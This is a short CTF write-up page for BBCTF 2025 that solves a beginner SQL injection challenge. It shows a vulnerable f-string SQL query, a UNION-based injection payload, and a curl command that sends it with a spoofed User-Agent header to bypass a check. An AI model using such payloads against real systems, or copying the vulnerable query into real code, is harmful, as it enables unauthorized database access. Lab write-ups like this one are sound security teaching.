@@ -1,0 +1,42 @@
+---
+title: 'BBCTF 2025'
+description: 'A compilation of BBCTF 2025 Writeups'
+date: 2025-05-05
+tags: ['BBCTF','CTF','Writeup']
+image: './assets/openpage.png'
+authors: ['bakayang','gr1d','w_11']
+license: 'CC BY-NC-SA 4.0'
+---
+## [Forensics]
+
+## [Web]
+
+## SQLI Series - 1
+
+### Goals
+---
+Exploit a SQL injection vulnerability to extract the flag from a database.
+
+### Solution
+---
+1. Identify the vulnerability in the search function where user input is directly inserted into SQL query:
+   ```python
+   query = f"SELECT * FROM products WHERE name LIKE '%{search_term}%'"
+   ```
+
+2. Craft a payload to escape the string and use UNION-based injection:
+   ```
+   ' UNION SELECT 1, flag_value FROM flag -- 
+   ```
+
+3. Send request with required User-Agent header to bypass authentication check:
+   ```bash
+   curl -X POST http://target-url/ \
+     -H "User-Agent: UMCS-CTF" \
+     -d "search=' UNION SELECT 1, flag_value FROM flag -- "
+   ```
+
+### Final Result
+---
+**Flag:** `BBCTF{sql_inj3ct10n_101}`
+
